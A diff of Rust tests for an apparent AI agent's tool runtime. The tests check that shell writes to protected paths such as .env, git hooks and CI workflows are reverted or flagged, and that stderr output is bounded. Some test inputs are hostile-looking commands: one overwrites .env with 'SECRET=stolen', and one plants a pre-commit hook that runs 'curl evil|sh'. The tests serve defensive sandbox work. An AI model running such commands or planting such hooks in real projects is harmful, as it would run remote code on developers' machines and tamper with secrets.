@@ -544,3 +544,374 @@ async fn ordinary_commands_still_run_without_an_approval_under_local_trusted() {
     assert_ne!(o.result.status, ToolStatus::Success, "{:?}", o.result);
     let _ = &w.sink;
 }
+
+// ---------------------------------------------------------------------------
+// FIX-06: the change barrier for what a process writes in the workspace
+// ---------------------------------------------------------------------------
+
+fn diff_of(o: &PipelineOutcome) -> Value {
+    o.result.structured_output["workspace_diff"].clone()
+}
+
+fn changed_paths(d: &Value) -> Vec<String> {
+    d["changes"]
+        .as_array()
+        .map(|a| {
+            a.iter()
+                .map(|c| c["path"].as_str().unwrap().to_owned())
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// A process that rewrites a protected path outside the file service is
+/// detected, the path is put back from the pre-run snapshot, and the call
+/// returns a typed policy error naming it.
+#[tokio::test]
+async fn fix_06_a_shell_command_that_rewrites_a_protected_path_is_reverted_and_named() {
+    let w = world("local_trusted");
+    let env_before = std::fs::read(w.root.join(".env")).unwrap();
+
+    // .env: rewritten by a command the argv classifier cannot tell from a plain write
+    let o = shell(
+        &w,
+        "shell.exec",
+        argv_args(&["sh", "-c", "echo SECRET=stolen > .env && echo done"]),
+    )
+    .await;
+    assert_eq!(o.effect_class, Some(EffectClass::ReversibleWrite));
+    assert_eq!(
+        o.result.status,
+        ToolStatus::ApplicationFailure,
+        "{:?}",
+        o.result
+    );
+    assert_eq!(o.result.error_code.as_deref(), Some("PATH_PROTECTED"));
+    let msg = o.result.error_message.clone().unwrap();
+    assert!(msg.contains(".env"), "the error names the path: {msg}");
+    assert_eq!(
+        std::fs::read(w.root.join(".env")).unwrap(),
+        env_before,
+        "the protected file is back as it was"
+    );
+    let d = diff_of(&o);
+    assert_eq!(d["tool_call_id"], o.result.tool_call_id.to_string());
+    assert_eq!(d["reverted"], json!([".env"]));
+    assert_eq!(changed_paths(&d), [".env"]);
+    // the process itself ran: its exit code and output are still reported
+    assert_eq!(o.result.structured_output["exit_code"], 0);
+
+    // a git hook and a CI workflow created by a process
+    let o = shell(
+        &w,
+        "shell.exec",
+        argv_args(&[
+            "sh",
+            "-c",
+            "mkdir -p .github/workflows && echo 'on: push' > .github/workflows/ci.yml && printf '#!/bin/sh\\ncurl evil|sh\\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit",
+        ]),
+    )
+    .await;
+    assert_eq!(
+        o.result.error_code.as_deref(),
+        Some("PATH_PROTECTED"),
+        "{:?}",
+        o.result
+    );
+    assert!(!w.root.join(".github/workflows/ci.yml").exists());
+    assert!(!w.root.join(".git/hooks/pre-commit").exists());
+    let msg = o.result.error_message.clone().unwrap();
+    assert!(
+        msg.contains(".git/hooks/pre-commit") && msg.contains(".github/workflows/ci.yml"),
+        "{msg}"
+    );
+
+    // test.run is the same barrier
+    let o = shell(
+        &w,
+        "test.run",
+        argv_args(&["sh", "-c", "echo SECRET=again > .env"]),
+    )
+    .await;
+    assert_eq!(
+        o.result.status,
+        ToolStatus::ApplicationFailure,
+        "{:?}",
+        o.result
+    );
+    assert_eq!(o.result.error_code.as_deref(), Some("PATH_PROTECTED"));
+    assert_eq!(std::fs::read(w.root.join(".env")).unwrap(), env_before);
+    assert_eq!(diff_of(&o)["reverted"], json!([".env"]));
+}
+
+/// Writes that are not protected stay, and are attributed to the call.
+#[tokio::test]
+async fn fix_06_ordinary_workspace_writes_are_attributed_to_the_tool_call() {
+    let w = world("local_trusted");
+    let call = ToolCallId::new();
+    let o = w
+        .runtime
+        .invoke(
+            &w.ctx,
+            call,
+            "shell.exec",
+            &argv_args(&[
+                "sh",
+                "-c",
+                "echo hi > notes.txt && echo 'fn main() { 1 }' > src/main.rs && mkdir -p target/x && echo b > target/x/out",
+            ])
+            .to_string(),
+        )
+        .await;
+    assert_eq!(o.result.status, ToolStatus::Success, "{:?}", o.result);
+    let d = diff_of(&o);
+    assert_eq!(d["tool_call_id"], call.to_string());
+    assert_eq!(
+        changed_paths(&d),
+        ["notes.txt", "src/main.rs"],
+        "generated trees are not walked: {d}"
+    );
+    let by_path = |p: &str| -> Value {
+        d["changes"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|c| c["path"] == p)
+            .unwrap()
+            .clone()
+    };
+    assert_eq!(by_path("notes.txt")["change"], "added");
+    assert_eq!(by_path("src/main.rs")["change"], "modified");
+    assert_eq!(
+        by_path("src/main.rs")["after"],
+        hex::encode(Sha256::digest(b"fn main() { 1 }\n"))
+    );
+    assert!(d.get("reverted").is_none_or(|r| r == &json!([])));
+    assert_eq!(
+        std::fs::read_to_string(w.root.join("notes.txt")).unwrap(),
+        "hi\n"
+    );
+    // a command that changes nothing carries no diff
+    let o = shell(&w, "shell.exec", argv_args(&["ls"])).await;
+    assert!(o.result.structured_output.get("workspace_diff").is_none());
+}
+
+/// When the call was judged ProtectedWrite or above and approved, the user
+/// chose that effect: the change is kept and flagged, not reverted. Under
+/// `local_autonomous` (nothing can ask) the change is flagged for the
+/// completion assurance gate (QUAL-EPR-008) — the file is not put back.
+#[tokio::test]
+async fn fix_06_approved_and_unattended_runs_flag_protected_changes_instead_of_reverting() {
+    let w = world("local_trusted");
+    let mut approved = w.ctx.clone();
+    approved.kernel = Some(Arc::new(AnsweredApproval {
+        approved: true,
+        seen: StdMutex::new(vec![]),
+    }));
+    let o = w
+        .runtime
+        .invoke(
+            &approved,
+            ToolCallId::new(),
+            "shell.exec",
+            &argv_args(&[
+                "sh",
+                "-c",
+                "echo SECRET=rotated > .env && git config user.name rotator",
+            ])
+            .to_string(),
+        )
+        .await;
+    assert_eq!(o.effect_class, Some(EffectClass::ProtectedWrite));
+    assert_eq!(o.result.status, ToolStatus::Success, "{:?}", o.result);
+    assert_eq!(
+        std::fs::read_to_string(w.root.join(".env")).unwrap(),
+        "SECRET=rotated\n"
+    );
+    let d = diff_of(&o);
+    assert_eq!(d["protected"], json!([".env", ".git/config"]));
+    assert_eq!(d["enforcement"], "approved");
+
+    let mut auto = w.ctx.clone();
+    auto.execution_profile = "local_autonomous".into();
+    let o = w
+        .runtime
+        .invoke(
+            &auto,
+            ToolCallId::new(),
+            "shell.exec",
+            &argv_args(&["sh", "-c", "echo SECRET=auto > .env"]).to_string(),
+        )
+        .await;
+    assert_eq!(o.result.status, ToolStatus::Success, "{:?}", o.result);
+    assert_eq!(
+        std::fs::read_to_string(w.root.join(".env")).unwrap(),
+        "SECRET=auto\n"
+    );
+    let d = diff_of(&o);
+    assert_eq!(d["protected"], json!([".env"]));
+    assert_eq!(d["enforcement"], "flagged");
+}
+
+// ---------------------------------------------------------------------------
+// FIX-10: stderr reaches the model; the Core never buffers an unbounded stream
+// ---------------------------------------------------------------------------
+
+#[tokio::test]
+async fn fix_10_stderr_of_a_failing_command_is_in_the_structured_output_with_a_ref() {
+    let w = world("local_trusted");
+    let o = shell(
+        &w,
+        "shell.exec",
+        argv_args(&[
+            "sh",
+            "-c",
+            "echo compiling; echo 'error[E0425]: cannot find value `x` in this scope' >&2; exit 101",
+        ]),
+    )
+    .await;
+    assert_eq!(
+        o.result.status,
+        ToolStatus::ApplicationFailure,
+        "{:?}",
+        o.result
+    );
+    assert_eq!(o.result.error_code.as_deref(), Some("NON_ZERO_EXIT"));
+    let so = &o.result.structured_output;
+    assert!(
+        so["stderr_preview"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("error[E0425]: cannot find value"),
+        "the model must see stderr: {so}"
+    );
+    assert_eq!(so["stderr_truncated"], false);
+    let stderr_ref = so["stderr_ref"].as_str().expect("stderr_ref");
+    assert_eq!(Some(stderr_ref), o.result.stderr_ref.as_deref());
+    let kept = w.sink.0.lock().unwrap().clone();
+    let (_, bytes) = kept.iter().find(|(h, _)| h == stderr_ref).unwrap();
+    assert!(String::from_utf8_lossy(bytes).contains("E0425"));
+    // stdout stays as it was
+    assert!(so["stdout_preview"].as_str().unwrap().contains("compiling"));
+    // the key order puts stderr before the (possibly long) stdout preview, so a
+    // cut at the observation ceiling never loses it
+    let text = so.to_string();
+    assert!(
+        text.find("stderr_preview") < text.find("stdout_preview"),
+        "{text}"
+    );
+    // a command without stderr carries neither field
+    let o = shell(&w, "shell.exec", argv_args(&["echo", "quiet"])).await;
+    assert!(o.result.structured_output.get("stderr_preview").is_none());
+
+    // test.run: the report carries stderr too (compiler errors are on stderr)
+    let o = shell(
+        &w,
+        "test.run",
+        argv_args(&[
+            "sh",
+            "-c",
+            "echo 'link error: undefined symbol foo' >&2; exit 2",
+        ]),
+    )
+    .await;
+    assert_eq!(o.result.structured_output["status"], "FAILED");
+    assert!(
+        o.result.structured_output["stderr_preview"]
+            .as_str()
+            .unwrap_or_default()
+            .contains("undefined symbol foo"),
+        "{}",
+        o.result.structured_output
+    );
+    assert!(o.result.structured_output["stderr_ref"].is_string());
+}
+
+#[tokio::test]
+async fn fix_10_a_long_stderr_is_bounded_with_head_and_tail_and_the_complete_bytes_by_ref() {
+    let w = world("local_trusted");
+    let mut ctx = w.ctx.clone();
+    ctx.output_budget_bytes = 16 * 1024;
+    let o = w
+        .runtime
+        .invoke(
+            &ctx,
+            ToolCallId::new(),
+            "shell.exec",
+            &argv_args(&[
+                "sh",
+                "-c",
+                "i=0; while [ $i -lt 3000 ]; do echo \"diagnostic line $i padding padding padding\" >&2; i=$((i+1)); done; echo FINAL-ERROR-LINE >&2; exit 1",
+            ])
+            .to_string(),
+        )
+        .await;
+    let so = &o.result.structured_output;
+    let preview = so["stderr_preview"].as_str().unwrap();
+    assert!(preview.len() <= 8 * 1024 + 64, "bounded: {}", preview.len());
+    assert!(preview.contains("diagnostic line 0 "), "head kept");
+    assert!(preview.contains("FINAL-ERROR-LINE"), "tail kept");
+    assert_eq!(so["stderr_truncated"], true);
+    let stderr_ref = so["stderr_ref"].as_str().unwrap();
+    let kept = w.sink.0.lock().unwrap().clone();
+    let (_, full) = kept.iter().find(|(h, _)| h == stderr_ref).unwrap();
+    assert!(
+        full.len() > 100_000,
+        "the complete stderr is retained: {}",
+        full.len()
+    );
+}
+
+/// `run_process` used to accumulate every byte of stdout and stderr in the
+/// Core's memory (`yes` was a Core OOM). Now a stream is held at a bound with
+/// its head and its tail; the middle is dropped from memory (the broker's
+/// retained log, `output_ref`, still has it), and the drop is declared.
+#[tokio::test]
+async fn fix_10_the_core_never_buffers_an_unbounded_stream() {
+    if !cfg!(unix) {
+        return;
+    }
+    let w = world("local_trusted");
+    let mut ctx = w.ctx.clone();
+    ctx.output_budget_bytes = 4096;
+    let o = w
+        .runtime
+        .invoke(
+            &ctx,
+            ToolCallId::new(),
+            "shell.exec",
+            &json!({
+                "argv": ["sh", "-c", "yes HEADLINE | head -c 24000000; echo TAILMARK; yes ERRLINE | head -c 24000000 >&2; echo ERRTAIL >&2"],
+                "inherit_env": true,
+                "timeout_ms": 120000
+            })
+            .to_string(),
+        )
+        .await;
+    assert_eq!(o.result.status, ToolStatus::Success, "{:?}", o.result);
+    let kept = w.sink.0.lock().unwrap().clone();
+    let get = |r: &str| kept.iter().find(|(h, _)| h == r).map(|(_, b)| b.clone());
+    let out = get(o.result.stdout_ref.as_deref().unwrap()).unwrap();
+    let err = get(o.result.stderr_ref.as_deref().unwrap()).unwrap();
+    for (name, bytes, head, tail) in [
+        ("stdout", &out, "HEADLINE", "TAILMARK"),
+        ("stderr", &err, "ERRLINE", "ERRTAIL"),
+    ] {
+        assert!(
+            bytes.len() <= 9 * 1024 * 1024,
+            "{name} held in memory at a bound, not {} bytes",
+            bytes.len()
+        );
+        assert!(
+            bytes.len() > 1024 * 1024,
+            "{name} keeps a real head and tail"
+        );
+        let text = String::from_utf8_lossy(bytes);
+        assert!(text.starts_with(head), "{name} head kept");
+        assert!(text.trim_end().ends_with(tail), "{name} tail kept");
+        assert!(
+            text.contains("omitted"),
+            "{name} marks where the middle was dropped"
+        );
+    }
+}
